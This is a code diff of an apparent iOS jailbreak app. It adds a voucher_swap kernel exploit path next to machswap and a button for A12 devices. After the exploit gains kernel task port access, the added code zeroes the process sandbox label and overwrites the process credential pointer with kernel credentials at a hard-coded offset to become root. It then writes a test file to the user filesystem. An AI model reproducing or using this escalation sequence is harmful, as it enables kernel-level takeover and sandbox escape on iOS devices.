@@ -8,12 +8,18 @@
 
 #import "Tw3lveView.h"
 
+
+#include "OffsetHolder.h"
+
 #include "ms_offsets.h"
 #include "machswap.h"
 #include "VarHolder.h"
 #include "patchfinder64.h"
 #include "utils.h"
 #include "kernel_utils.h"
+#include "remap_tfp_set_hsp.h"
+
+#include "voucher_swap.h"
 
 #define KERNEL_SEARCH_ADDRESS 0xfffffff007004000
 //ff8ffc000
@@ -25,6 +31,14 @@
 @end
 
 @implementation Tw3lveView
+
+
+
+uint32_t proc_ucred;
+uint64_t kern_ucred;
+
+
+
 
 Tw3lveView *sharedController = nil;
 
@@ -61,7 +75,7 @@ void runOnMainQueueWithoutDeadlocking(void (^block)(void))
 
 bool restoreFS = false;
 
-
+bool voucher_swap_exp = false;
 
 void jelbrek()
 {
@@ -79,18 +93,21 @@ void jelbrek()
             });
         }
         
-        ms_offsets_t *ms_offs = get_machswap_offsets();
-        machswap_exploit(ms_offs, &tfp0, &kbase);
-        kslide = kbase - KERNEL_SEARCH_ADDRESS;
+        if (voucher_swap_exp)
+        {
+            voucher_swap();
+        } else {
+            ms_offsets_t *ms_offs = get_machswap_offsets();
+            machswap_exploit(ms_offs, &tfp0, &kbase);
+            kslide = kbase - KERNEL_SEARCH_ADDRESS;
+        }
         
         
-        if (tfp0 == 0 || kbase == 0)
+        if (!MACH_PORT_VALID(tfp0) || tfp0 == 0 || kbase == 0)
         {
             NSLog(@"Exploit Failed!");
             break;
         }
-        
-        init_kernel_utils(tfp0);
         
         runOnMainQueueWithoutDeadlocking(^{
             NSLog(@"%@", [NSString stringWithFormat:@"TFP0: %x", tfp0]);
@@ -99,9 +116,33 @@ void jelbrek()
         });
         
         
-        //PATCHFINDER64
-        InitPatchfinder(kbase, NULL);
-        unsandbox(getpid());
+        //Unsandbox
+        setOwO(tfp0);
+        KernelWrite_64bits(cr_label + 0x10, 0);
+        
+        //SetUID shitz
+        kern_ucred = get_kernel_addr();
+        
+        KernelWrite_64bits(ourproc + 0xf8, kern_ucred);
+        
+        
+        
+        
+        
+        //I AM gROOT
+        if (getuid() == 0 && getgid() == 0)
+        {
+            NSLog(@"I AM G(ROOT)!");
+        } else {
+            NSLog(@"REBOOT ME OH MA GAW THE PAIN!");
+            break;
+        }
+        
+        NSLog(@"Writing a test file to UserFS...");
+        const char *testFile = [NSString stringWithFormat:@"/var/mobile/test-%lu.txt", time(NULL)].UTF8String;
+        _assert(create_file(testFile, 0, 0644), @"Failed!", true);
+        _assert(clean_file(testFile), @"Failed!", true);
+        NSLog(@"Successfully wrote a test file to UserFS.");
         
         
         break;
@@ -121,6 +162,19 @@ void jelbrek()
     
     jelbrek();
 }
+
+- (IBAction)jelbrekA12Clik:(id)sender {
+    
+    runOnMainQueueWithoutDeadlocking(^{
+        NSLog(@"Jailbreak Button Clicked! A12");
+    });
+    
+    
+    voucher_swap_exp = true;
+    
+    jelbrek();
+}
+
 
 
 @end
